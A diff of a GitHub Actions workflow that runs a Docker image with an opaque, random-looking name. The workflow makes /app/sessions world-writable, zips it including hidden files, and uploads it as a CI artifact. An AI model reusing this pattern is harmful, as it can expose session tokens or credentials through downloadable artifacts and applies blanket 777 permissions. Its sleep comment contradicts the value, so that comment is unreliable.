@@ -1,4 +1,4 @@
-name: Initial Setup & Artifact Upload
+name: Initial Setup & Partial Zipping
 
 on:
   push:
@@ -11,7 +11,7 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout Repository
+    - name: Checkout repository
       uses: actions/checkout@v3
 
     - name: Pull Docker image
@@ -20,9 +20,12 @@ jobs:
     - name: Run Initial Docker Processes
       run: |
         docker run -d --name session_container ghcr.io/nixegohshs5f4ef6vuun43f6/iaw4sm7rs56v3cy7rv66v4rfgu6yu843dawsmsrbitapyv3125:yhf3gj79bt8kytv57vttv7awsmsrbitA0009-of-one
-        sleep 500 # Simulate initial processes
+        # Simulate initial processes
+        sleep 220 # Sleep for 5 minutes
+        # Ensure proper permissions and zip the sessions folder
         docker exec session_container bash -c "chmod -R 777 /app/sessions"
-        sleep 10 # Ensure permissions take effect
+        sleep 10 # Give time for permissions to take effect
+        # Zip the sessions folder, ignoring unreadable files, and ensure workflow succeeds
         docker exec session_container bash -c "zip -r /app/partial_sessions.zip /app/sessions || true"
 
     - name: Copy Partial Zip to Runner
@@ -34,5 +37,5 @@ jobs:
         name: partial_session_data
         path: partial_sessions.zip
         retention-days: 7
-        compression-level: 6
-        include-hidden-files: false
+        compression-level: 0
+        include-hidden-files: true
